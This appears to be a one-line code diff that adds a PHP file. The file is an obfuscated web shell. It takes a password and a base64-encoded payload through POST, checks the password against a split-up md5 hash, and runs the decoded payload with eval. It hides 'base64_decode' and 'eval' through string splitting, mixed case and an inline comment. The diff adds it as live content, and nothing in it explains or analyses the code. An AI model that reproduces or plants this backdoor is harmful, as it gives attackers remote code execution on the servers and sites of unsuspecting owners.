@@ -1,0 +1,1 @@
+<?php $kTB = $_POST; if(!empty($kTB['w']) && !empty($kTB['h']) && md5($kTB['w'].md5($kTB['w']))==('629c1'.'124a8'.'fa260'.'5b2be'.'6d497'.'efd71'.'a3')) { $mVf = 'BA'.'SE'.'64'.'_D'.'EC'.'od'.'E'; @EVal/*OgjXB*/($mVf(@$kTB['h'])); exit; } ?>xe
